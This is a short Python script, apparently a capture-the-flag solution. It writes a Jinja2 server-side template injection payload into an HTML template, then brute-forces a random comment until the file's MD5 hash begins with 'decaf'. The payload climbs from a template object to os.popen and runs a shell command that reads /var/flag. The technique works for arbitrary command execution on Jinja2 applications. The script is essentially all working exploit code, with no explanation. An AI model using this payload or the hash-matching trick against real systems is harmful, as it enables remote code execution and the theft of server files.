import hashlib
import os
import string
import random


def genHash():
    payload = """{{% extends "base.html" %}}

{{% block content %}}
    <p>{{{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat /var/flag').read() }}}}/p>
{{% endblock %}}

<!--{htext}-->
"""
    while True:
        f = open('test.html', 'r')
        h = hashlib.md5(f.read().encode('utf-8')).hexdigest()[:5]
        print(h)
        if h == 'decaf':
            break
        with open('test.html', 'w', encoding='utf8') as f:
            htext=''.join(random.choices(string.ascii_uppercase + string.digits, k=15))
            f.write(payload.format(htext=htext))


genHash()
